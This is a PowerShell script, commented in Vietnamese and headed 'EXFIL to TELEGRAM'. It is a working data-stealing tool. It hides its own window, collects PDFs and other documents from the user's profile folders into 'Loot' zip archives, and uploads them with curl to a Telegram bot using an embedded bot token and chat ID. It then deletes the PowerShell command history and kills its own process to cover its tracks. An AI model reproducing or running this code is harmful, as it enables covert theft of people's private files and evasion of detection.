<# 
============================================ EXFIL to TELEGRAM =================================================
#>
param (
    [string[]]$FileType,
    [string[]]$Path,
    [string]$hide = 'y'
)

# 1. Cơ chế ẩn cửa sổ (Stealth Mode) - Phải đặt trên cùng sau param
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
    if($w -ne [System.IntPtr]::Zero){ [void]$t::ShowWindowAsync($w,0) }
}

# 2. Thiết lập Telegram
$Token = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
$ChatID = "8312702210"
$TeleURL = "https://api.telegram.org/bot$Token/sendDocument"

Function FindAndSend {
    param ([string[]]$FileType, [string[]]$Path)
    
    $maxZipFileSize = 15MB  # Telegram Bot API giới hạn 50MB cho mỗi file gửi qua bot
    $currentZipSize = 0
    $index = 1
    $zipFilePath ="$env:temp\Loot$index.zip"

    # Thiết lập thư mục tìm kiếm
    $Path = "Downloads"
    if($Path -ne $null){
        $foldersToSearch = "$env:USERPROFILE\$Path"
    } else {
        $foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads")
    }

    # Thiết lập định dạng file
    $FileType = "pdf"
    if($FileType -ne $null){
        $fileExtensions = "*." + $FileType
    } else {
        $fileExtensions = @("*.txt", "*.doc*", "*.pdf", "*.xls*", "*.png", "*.jpg", "*.key")
    }

    Add-Type -AssemblyName System.IO.Compression.FileSystem

    # Kiểm tra và tạo thư mục nén
    if (Test-Path $zipFilePath) { Remove-Item $zipFilePath -Force }
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')

    foreach ($folder in $foldersToSearch) {
        if (!(Test-Path $folder)) { continue }
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse -ErrorAction SilentlyContinue
            foreach ($file in $files) {
                $fileSize = $file.Length
                
                # Nếu file nén đầy, đóng gói và gửi
                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                    $zipArchive.Dispose()
                    # GỬI QUA TELEGRAM
                    curl.exe -X POST $TeleURL -F "chat_id=$ChatID" -F "document=@$zipFilePath" | Out-Null
                    
                    Remove-Item $zipFilePath -Force
                    $index++
                    $currentZipSize = 0
                    $zipFilePath ="$env:temp\Loot$index.zip"
                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                }
                
                try {
                    $entryName = $file.FullName.Substring($folder.Length + 1)
                    [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                    $currentZipSize += $fileSize
                } catch {}
            }
        }
    }
    
    # Gửi phần còn lại
    $zipArchive.Dispose()
    if ($currentZipSize -gt 0) {
        curl.exe -X POST $TeleURL -F "chat_id=$ChatID" -F "document=@$zipFilePath" | Out-Null
        Remove-Item $zipFilePath -Force
    }
}

# Chạy hàm
FindAndSend -FileType $FileType -Path $Path

# Xóa dấu vết lịch sử lệnh
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
Stop-Process -Id $PID -Force
